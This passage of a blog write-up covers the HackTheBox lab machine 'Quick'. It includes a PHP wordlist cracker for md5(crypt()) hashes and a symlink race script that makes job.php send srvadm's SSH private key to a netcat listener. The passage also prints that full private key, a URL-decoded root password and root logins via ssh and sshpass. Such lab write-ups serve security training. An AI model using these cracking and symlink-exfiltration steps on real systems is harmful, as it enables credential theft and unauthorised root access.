+        <span class="nv">$email</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"email"</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">"password"</span><span class="p">];</span>
+        <span class="nv">$password</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$password</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
+              <span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select email,password from users where email=? and password=?"</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bind_param</span><span class="p">(</span><span class="s2">"ss"</span><span class="p">,</span><span class="nv">$email</span><span class="p">,</span><span class="nv">$password</span><span class="p">);</span>
+        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+        <span class="nv">$result</span> <span class="o">=</span> <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">get_result</span><span class="p">();</span>
+        <span class="nv">$num_rows</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span><span class="p">;</span>
+        <span class="k">if</span><span class="p">(</span><span class="nv">$num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$email</span> <span class="o">===</span> <span class="s2">"srvadm@quick.htb"</span><span class="p">)</span>
+
+</pre></table></code></div></div><p>And we got an email <code class="language-plaintext highlighter-rouge">srvadm@quick.htb</code> In this file we can clearly see that its using <code class="language-plaintext highlighter-rouge">crypt</code> function along with the salt <code class="language-plaintext highlighter-rouge">fa</code>.Its easy now to carck the hash.I made a <code class="language-plaintext highlighter-rouge">php</code> script to <code class="language-plaintext highlighter-rouge">crack</code> the hash.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="nv">$hash</span> <span class="o">=</span> <span class="s1">'e626d51f8fbfd1124fdea88396c35d05'</span><span class="p">;</span>
+<span class="nv">$wordlist</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">"/usr/share/wordlists/rockyou.txt"</span><span class="p">,</span><span class="s2">"r"</span><span class="p">);</span>
+<span class="nv">$count</span>  <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="nv">$start_time</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+<span class="k">while</span><span class="p">(</span><span class="o">!</span> <span class="nb">feof</span><span class="p">(</span><span class="nv">$wordlist</span><span class="p">))</span>  <span class="p">{</span>
+	<span class="nv">$str</span> <span class="o">=</span> <span class="nb">fgets</span><span class="p">(</span><span class="nv">$wordlist</span><span class="p">);</span>
+  <span class="nv">$str</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$str</span><span class="p">);</span>
+  <span class="nv">$genhash</span> <span class="o">=</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">crypt</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="s1">'fa'</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nv">$hash</span> <span class="o">==</span> <span class="nv">$genhash</span><span class="p">){</span>
+    <span class="k">echo</span> <span class="s2">"Password Found: "</span><span class="o">.</span> <span class="nv">$str</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="nv">$end_time</span> <span class="o">=</span> <span class="nb">microtime</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span> 
+    <span class="nv">$execution_time</span> <span class="o">=</span> <span class="p">(</span><span class="nv">$end_time</span> <span class="o">-</span> <span class="nv">$start_time</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">"Tried Passwords:="</span><span class="o">.</span> <span class="nv">$count</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">echo</span> <span class="s2">"Time taken in cracking = "</span><span class="o">.</span><span class="nv">$execution_time</span><span class="o">.</span><span class="s2">" sec"</span><span class="p">;</span>
+    <span class="nb">fclose</span><span class="p">(</span><span class="nv">$wordlist</span><span class="p">);</span>
+    <span class="k">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="k">else</span>
+  <span class="p">{</span>
+    <span class="nv">$count</span> <span class="o">=</span> <span class="nv">$count</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
+  <span class="p">}</span>
+  <span class="p">}</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$wordlist</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</pre></table></code></div></div><p>Which will open the file <code class="language-plaintext highlighter-rouge">rockyou.txt</code> in read mode and using crypt function we will generate the hash for the str.And if the <code class="language-plaintext highlighter-rouge">generated</code> hash is equal to the <code class="language-plaintext highlighter-rouge">hash</code> then print the <code class="language-plaintext highlighter-rouge">str</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+</pre><td class="rouge-code"><pre>➜  quick php decrypt.php 
+Password Found: yl51pbx
+Tried Passwords:<span class="o">=</span>1149368
+Time taken <span class="k">in </span>cracking <span class="o">=</span> 14.459904909134 sec
+</pre></table></code></div></div><p>And we cracked the password. <code class="language-plaintext highlighter-rouge">yl51pbx</code></p><h2 id="finding-subdomain">Finding subdomain</h2><p>Now the question where to use these credentials.If we look up in some of the <code class="language-plaintext highlighter-rouge">apache2</code> config files we get to know a subdomain.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+</pre><td class="rouge-code"><pre>sam@quick:/etc/apache2/sites-available<span class="nv">$ </span><span class="nb">cat </span>000-default.conf 
+&lt;VirtualHost <span class="k">*</span>:80&gt;
+	ServerAdmin webmaster@localhost
+	DocumentRoot /var/www/html
+
+	ErrorLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/error.log
+	CustomLog <span class="k">${</span><span class="nv">APACHE_LOG_DIR</span><span class="k">}</span>/access.log combined
+
+&lt;/VirtualHost&gt;
+&lt;VirtualHost <span class="k">*</span>:80&gt;
+	AssignUserId srvadm srvadm
+	ServerName printerv2.quick.htb
+	DocumentRoot /var/www/printer
+&lt;/VirtualHost&gt;
+<span class="c"># vim: syntax=apache ts=4 sw=4 sts=4 sr noet</span>
+</pre></table></code></div></div><p>And the subdomain we got is <code class="language-plaintext highlighter-rouge">printerv2.quick.htb</code> . apache2 service running on port 80 and since there was no any remote <code class="language-plaintext highlighter-rouge">port:80</code> opened.so the service is running locally.</p><p>I forwarded the port 80 to my <code class="language-plaintext highlighter-rouge">localhost</code> and added a entry of subdomain <code class="language-plaintext highlighter-rouge">printerv2.quick.htb</code> to my <strong>/etc/hosts</strong> file.</p><h2 id="accessing-the-printer-services">Accessing the printer services</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>➜  quick ssh <span class="nt">-i</span> /home/prashant/.ssh/id_rsa <span class="nt">-L</span> 80:127.0.0.1:80 sam@quick.htb
+</pre></table></code></div></div><p>And now i can access the <code class="language-plaintext highlighter-rouge">localhost:80</code> and the subdomain too.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-9.png" alt="Subdomain" /></p><p>I was able to sign-up successfully there.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-10.png" alt="Subdomain" /></p><p>This is a basic site with some add-printer functionality.</p><p>If we go back to our shell . We can see some files are there in <code class="language-plaintext highlighter-rouge">printers</code> dir.</p><h2 id="exploiting-the-race-conditions">Exploiting the race conditions</h2><p>There is a file called <code class="language-plaintext highlighter-rouge">job.php</code> . which has a race conditions in it.</p><div class="language-php highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="cp">&lt;?php</span>
+<span class="k">require</span> <span class="k">__DIR__</span> <span class="o">.</span> <span class="s1">'/escpos-php/vendor/autoload.php'</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nn">Mike42\Escpos\PrintConnectors\NetworkPrintConnector</span><span class="p">;</span>
+<span class="kn">use</span> <span class="nn">Mike42\Escpos\Printer</span><span class="p">;</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"db.php"</span><span class="p">);</span>
+<span class="nb">session_start</span><span class="p">();</span>
+
+<span class="k">if</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s2">"loggedin"</span><span class="p">])</span>
+<span class="p">{</span>
+	<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"submit"</span><span class="p">]))</span>
+	<span class="p">{</span>
+		<span class="nv">$title</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"title"</span><span class="p">];</span>
+		<span class="nv">$file</span> <span class="o">=</span> <span class="nb">date</span><span class="p">(</span><span class="s2">"Y-m-d_H:i:s"</span><span class="p">);</span>
+		<span class="nb">file_put_contents</span><span class="p">(</span><span class="s2">"/var/www/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">"desc"</span><span class="p">]);</span>
+		<span class="nb">chmod</span><span class="p">(</span><span class="s2">"/var/www/printer/jobs/"</span><span class="o">.</span><span class="nv">$file</span><span class="p">,</span><span class="s2">"0777"</span><span class="p">);</span>
+		<span class="nv">$stmt</span><span class="o">=</span><span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"select ip,port from jobs"</span><span class="p">);</span>
+		<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
+</pre></table></code></div></div><p>What the file is doing is <code class="language-plaintext highlighter-rouge">making</code> a file with name of the <code class="language-plaintext highlighter-rouge">timestamp</code>.And if we read the content of the file it is sending the file to <code class="language-plaintext highlighter-rouge">print</code> it to the <code class="language-plaintext highlighter-rouge">ip</code> of a specified <code class="language-plaintext highlighter-rouge">port</code>.If you look at the ad-printer from the port 80 on subdomain there is an ip and port to be specified.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-11.png" alt="Add-printer" /></p><p>What i am gonna do is , since we have read and write permission to the directory <code class="language-plaintext highlighter-rouge">/var/www/jobs</code> so we can symlink the file with the <code class="language-plaintext highlighter-rouge">private-keys</code> of user <strong>srvadm</strong> and start a listener on the port that i specified on <code class="language-plaintext highlighter-rouge">add_printer.php</code> and then access the file <code class="language-plaintext highlighter-rouge">job.php</code>.</p><p>I made a script to symlink the file with the <code class="language-plaintext highlighter-rouge">/home/srvadm/.ssh/id_rsa</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre><td class="rouge-code"><pre><span class="nb">cd</span> /var/www/jobs<span class="p">;</span>
+<span class="k">while </span><span class="nb">true</span><span class="p">;</span>
+<span class="k">do
+        for </span>file <span class="k">in</span> <span class="si">$(</span><span class="nb">ls</span> .<span class="si">)</span><span class="p">;</span>
+        <span class="k">do
+                </span><span class="nb">rm</span> <span class="nt">-rf</span> <span class="nv">$file</span><span class="p">;</span>
+                <span class="nb">ln</span> <span class="nt">-s</span> /home/srvadm/.ssh/id_rsa <span class="nv">$file</span><span class="p">;</span>
+        <span class="k">done
+done</span>
+</pre></table></code></div></div><p>So lets add a printer first</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-12.png" alt="Add-printer" /></p><p>And then execute the above symlink.sh script.</p><p>and then access the <code class="language-plaintext highlighter-rouge">http://printerv2.quick.htb/job.php</code> and click on print</p><p>start a nc listener on specified port.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>sam@quick:~<span class="nv">$ </span>./symlink.sh
+</pre></table></code></div></div><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/quick/e59d2541-6f41-40b3-bbdb-21ff0c080d36/image-13.png" alt="jobs.php" /></p><p>And click on print and we are done.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre>➜  prashant nc <span class="nt">-knlvp</span> 5555          
+Ncat: Version 7.80 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::5555
+Ncat: Listening on 0.0.0.0:5555
+Ncat: Connection from 10.10.10.186.
+Ncat: Connection from 10.10.10.186:53894.
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+MIIEpQIBAAKCAQEAutSlpZLFoQfbaRT7O8rP8LsjE84QJPeWQJji6MF0S/RGCd4P
+AP1UWD26CAaDy4J7B2f5M/o5XEYIZeR+KKSh+mD//FOy+O3sqIX37anFqqvhJQ6D
+1L2WOskWoyZzGqb8r94gN9TXW8TRlz7hMqq2jfWBgGm3YVzMKYSYsWi6dVYTlVGY
+DLNb/88agUQGR8cANRis/2ckWK+GiyTo5pgZacnSN/61p1Ctv0IC/zCOI5p9CKnd
+whOvbmjzNvh/b0eXbYQ/Rp5ryLuSJLZ1aPrtK+LCnqjKK0hwH8gKkdZk/d3Ofq4i
+hRiQlakwPlsHy2am1O+smg0214HMyQQdn7lE9QIDAQABAoIBAG2zSKQkvxgjdeiI
+ok/kcR5ns1wApagfHEFHxAxo8vFaN/m5QlQRa4H4lI/7y00mizi5CzFC3oVYtbum
+Y5FXwagzZntxZegWQ9xb9Uy+X8sr6yIIGM5El75iroETpYhjvoFBSuedeOpwcaR+
+DlritBg8rFKLQFrR0ysZqVKaLMmRxPutqvhd1vOZDO4R/8ZMKggFnPC03AkgXkp3
+j8+ktSPW6THykwGnHXY/vkMAS2H3dBhmecA/Ks6V8h5htvybhDLuUMd++K6Fqo/B
+H14kq+y0Vfjs37vcNR5G7E+7hNw3zv5N8uchP23TZn2MynsujZ3TwbwOV5pw/CxO
+9nb7BSECgYEA5hMD4QRo35OwM/LCu5XCJjGardhHn83OIPUEmVePJ1SGCam6oxvc
+bAA5n83ERMXpDmE4I7y3CNrd9DS/uUae9q4CN/5gjEcc9Z1E81U64v7+H8VK3rue
+F6PinFsdov50tWJbxSYr0dIktSuUUPZrR+in5SOzP77kxZL4QtRE710CgYEAz+It
+T/TMzWbl+9uLAyanQObr5gD1UmG5fdYcutTB+8JOXGKFDIyY+oVMwoU1jzk7KUtw
+8MzyuG8D1icVysRXHU8btn5t1l51RXu0HsBmJ9LaySWFRbNt9bc7FErajJr8Dakj
+b4gu9IKHcGchN2akH3KZ6lz/ayIAxFtadrTMinkCgYEAxpZzKq6btx/LX4uS+kdx
+pXX7hULBz/XcjiXvKkyhi9kxOPX/2voZcD9hfcYmOxZ466iOxIoHkuUX38oIEuwa
+GeJol9xBidN386kj8sUGZxiiUNoCne5jrxQObddX5XCtXELh43HnMNyqQpazFo8c
+Wp0/DlGaTtN+s+r/zu9Z8SECgYEAtfvuZvyK/ZWC6AS9oTiJWovNH0DfggsC82Ip
+LHVsjBUBvGaSyvWaRlXDaNZsmMElRXVBncwM/+BPn33/2c4f5QyH2i67wNpYF0e/
+2tvbkilIVqZ+ERKOxHhvQ8hzontbBCp5Vv4E/Q/3uTLPJUy5iL4ud7iJ8SOHQF4o
+x5pnJSECgYEA4gk6oVOHMVtxrXh3ASZyQIn6VKO+cIXHj72RAsFAD/98intvVsA3
++DvKZu+NeroPtaI7NZv6muiaK7ZZgGcp4zEHRwxM+xQvxJpd3YzaKWZbCIPDDT/u
+NJx1AkN7Gr9v4WjccrSk1hitPE1w6cmBNStwaQWD+KUUEeWYUAx20RA<span class="o">=</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+</pre></table></code></div></div><p>we got <code class="language-plaintext highlighter-rouge">private-ssh-keys</code> for user <strong>srvadm</strong></p><h1 id="login-as-srvadm">Login as srvadm</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>➜  quick ssh <span class="nt">-i</span> id_rsa srvadm@quick.htb
+Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Apr 30 14:49:08 UTC 2020
+
+  System load:  0.28               Users logged <span class="k">in</span>:                1
+  Usage of /:   30.1% of 19.56GB   IP address <span class="k">for </span>ens33:           10.10.10.186
+  Memory usage: 17%                IP address <span class="k">for </span>br-9ef1bb2e82cd: 172.18.0.1
+  Swap usage:   0%                 IP address <span class="k">for </span>docker0:         172.17.0.1
+  Processes:    135
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+54 packages can be updated.
+28 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Apr 30 14:47:19 2020 from 10.10.x.x
+srvadm@quick:~<span class="err">$</span>
+</pre></table></code></div></div><h1 id="privilege-escalation-to-root">Privilege escalation to root</h1><p>The story from <code class="language-plaintext highlighter-rouge">srvadm</code> <strong>-»</strong> <code class="language-plaintext highlighter-rouge">root</code> is very short and quick</p><p>Some manual enumeration gives us a dir called <code class="language-plaintext highlighter-rouge">.cache</code> in <code class="language-plaintext highlighter-rouge">srvadm</code> dir. And there is a file called printers.conf</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>srvadm@quick:~/.cache/conf.d<span class="nv">$ </span><span class="nb">cat </span>printers.conf 
+</pre></table></code></div></div><p>if you read its content there is a line</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+</pre></table></code></div></div><p>If we decode this as url. we will get the plain text.</p><p>we got</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre><td class="rouge-code"><pre>https://srvadm@quick.htb:&amp;ftQ4K3SGde8?@printerv3.quick.htb/printer
+</pre></table></code></div></div><p>The <code class="language-plaintext highlighter-rouge">&amp;ftQ4K3SGde8?</code> is the password for root user.</p><h1 id="getting-roottxt">Getting root.txt</h1><p>i am logged in as root</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+</pre><td class="rouge-code"><pre>➜  prashant sshpass <span class="nt">-p</span>  <span class="s2">"&amp;ftQ4K3SGde8?"</span> ssh root@quick.htb   
+Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Apr 30 14:57:06 UTC 2020
+
+  System load:  0.0                Users logged <span class="k">in</span>:                1
+  Usage of /:   30.1% of 19.56GB   IP address <span class="k">for </span>ens33:           10.10.10.186
+  Memory usage: 17%                IP address <span class="k">for </span>br-9ef1bb2e82cd: 172.18.0.1
+  Swap usage:   0%                 IP address <span class="k">for </span>docker0:         172.17.0.1
+  Processes:    136
+
+
+ <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+54 packages can be updated.
+28 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Mon Apr 20 08:01:18 2020
+root@quick:~#
+</pre></table></code></div></div><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>root@quick:~# <span class="nb">cat </span>root.txt
+a91-------------------------b41
+root@quick:~# 
+</pre></table></code></div></div><p>And we pwned it …….</p><p>If u liked the writeup.Support a Poor Student to Get the <code class="language-plaintext highlighter-rouge">OSCP-Cert</code> on <a href="https://www.buymeacoffee.com/0xprashant" target="_blank">BuymeaCoffee</a></p><blockquote><p>If you want to get notified as soon as i upload something new to my <code class="language-plaintext highlighter-rouge">blog</code> So just click on the bell icon you are seeing on the right side – &gt; and allow push <code class="language-plaintext highlighter-rouge">notification</code></p></blockquote><h1 id="resources">Resources</h1><div class="table-wrapper"><table><thead><tr><th>Topic<th>Url<tbody><tr><td>Article on XSLT-Injection<td><a href="https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/" target="_blank">Click-Here</a></table></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>Hackthebox</a>, <a href='/categories/active/'>active</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/http3/" class="post-tag no-text-decoration" >http3</a> <a href="/tags/xslt-injection/" class="post-tag no-text-decoration" >Xslt-Injection</a> <a href="/tags/php-crypt/" class="post-tag no-text-decoration" >php-crypt</a> <a href="/tags/symlink/" class="post-tag no-text-decoration" >symlink</a> <a href="/tags/hackthebox/" class="post-tag no-text-decoration" >hackthebox</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Quick writeup - 0xPrashant&url=http://localhost:4000/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Quick writeup - 0xPrashant&u=http://localhost:4000/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Hackthebox Quick writeup - 0xPrashant&url=http://localhost:4000/posts/htb-quick/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hackthebox/">hackthebox</a> <a class="post-tag" href="/tags/john/">john</a> <a class="post-tag" href="/tags/wfuzz/">wfuzz</a> <a class="post-tag" href="/tags/cracking-id_rsa/">cracking id_rsa</a> <a class="post-tag" href="/tags/docker/">docker</a> <a class="post-tag" href="/tags/ftp/">ftp</a> <a class="post-tag" href="/tags/ldap/">ldap</a> <a class="post-tag" href="/tags/ldapsearch/">ldapsearch</a> <a class="post-tag" href="/tags/lfi/">lfi</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-sniper/"><div class="card-body"> <span class="timeago small" > Mar 27 <i class="unloaded">2020-03-27T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Sniper writeup</h3><div class="text-muted small"><p> information Column Details Name Sniper Points 30 Difficulty Medium Creator Minato...</p></div></div></a></div><div class="card"> <a href="/posts/htb-admirer/"><div class="card-body"> <span class="timeago small" > May 4 <i class="unloaded">2020-05-04T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Admirer writeup</h3><div class="text-muted small"><p> Information@admirer:~$ Column Details Name Admirer IP 10.10.10.187 Points 20 Os L...</p></div></div></a></div><div class="card"> <a href="/posts/htb-akerva/"><div class="card-body"> <span class="timeago small" > Jun 12 <i class="unloaded">2020-06-12T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Fortress Akerva writeup</h3><div class="text-muted small"><p> Introduction@Akerva:~$ Column Details Name Akerva IP 10.13.37.11 Category Fortress Os ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-magic/" class="btn btn-outline-primary"><p>Hackthebox Magic writeup</p></a> <a href="/posts/htb-openadmin/" class="btn btn-outline-primary"><p>Hackthebox Openadmin writeup</p></a></div><div id="disqus" class="pt-2 pb-2"><p class="font-italic text-center text-muted small"> Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script src="/assets/js/lib/jquery.disqusloader.min.js"></script> <script> var options = { scriptUrl: '//0xprashant.disqus.com/embed.js', disqusConfig: function() { this.page.url = 'http://localhost:4000/posts/htb-quick/'; this.page.identifier = '/posts/htb-quick/'; } }; $.disqusLoader('#disqus', options); </script></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('#post-wrapper img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"> <br></br> <script src="https://www.hackthebox.eu/badge/84820"></script></p></div><p class="mb-0"> © 2020 <a href="https://www.facebook.com/prashant.saini.37201">Prashant Saini</a>. <script> (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){ (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) })(window,document,'script','https://www.google-analytics.com/analytics.js','ga'); ga('create', 'UA-157514490-1', 'auto'); ga('send', 'pageview'); </script> <script data-name="BMC-Widget" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="0xprashant" data-description="Support me on Buy me a coffee!" data-message="Like The Blog? Support Me!" data-color="#5F7FFF" data-position="right" data-x_margin="18" data-y_margin="18"></script></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-xl-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending 